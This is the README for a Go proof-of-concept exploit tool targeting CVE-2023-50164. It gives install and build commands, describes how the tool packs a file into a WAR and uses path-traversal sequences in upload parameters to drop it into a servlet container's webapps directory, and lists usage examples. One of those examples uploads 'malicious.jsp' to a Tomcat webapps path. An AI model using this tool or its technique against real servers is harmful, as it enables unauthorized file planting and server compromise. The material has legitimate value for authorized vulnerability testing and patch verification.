PoC for CVE-2023-50164
===

Install

  To install this tool you must have Go version at least 1.20 installed and configured.

  $ go install github.com/dwisiswant0/cve-2023-50164-poc@latest

  Alternatively, you can compile it by DIY:
  $ git clone http://github.com/dwisiswant0/cve-2023-50164-poc cve-2023-50164-poc/
  $ cd $_
  $ go build .

How it Works?

  This tool operates through a series of stages to execute the exploit.
  For instance, if your want to upload `/path/to/file-you-want-to-upload.txt` file, the tool proceeds as follows:

  1. It compresses the specified file into a WAR file, generating a `file-you-want-to-upload.war` in the
  OS-specific temporary directory. Thus, the tool assumes that the servlet context file path is
  `/file-you-want-to-upload/file-you-want-to-upload.txt`. Note that the `jar` command should be present in your
  system's $PATH.

  2. It checks whether the servlet context file path already exists. If it does, the tool immediately returns an
  error.

  3. The tool attempts to upload the WAR file by manipulating file upload parameters.

  4. Subsequently, it double-checks the availability (status code 200) of the servlet context file path,
  indicating successful file upload. Note that these checks succeed if the provided target path is an accessible
  root path, such as `/var/lib/jetty/webapps` for Jetty or `/opt/tomcat/webapps` for Apache Tomcat. The traversal
  sequences will differ for each servlet.

Usage

    Usage:
      cve-2023-50164-poc -u <URL> -f <FILE> -p <PATH>

    Options:
      -u, --url <URL>             Specify the upload endpoint URL
      -f, --file <FILE>           Provide the payload file for uploading
      -t, --traverse-seq <N>      Generate traversal sequences N times
      -p, --path <PATH>           Specify the path to the accessible root directory

    Example:
      cve-2023-50164-poc -u http://host/path/to/upload.action -f foo.txt -t 1 -p webapps
      cve-2023-50164-poc -u http://host/upload/upload.action -f malicious.jsp -t 2 -p /opt/tomcat/webapps
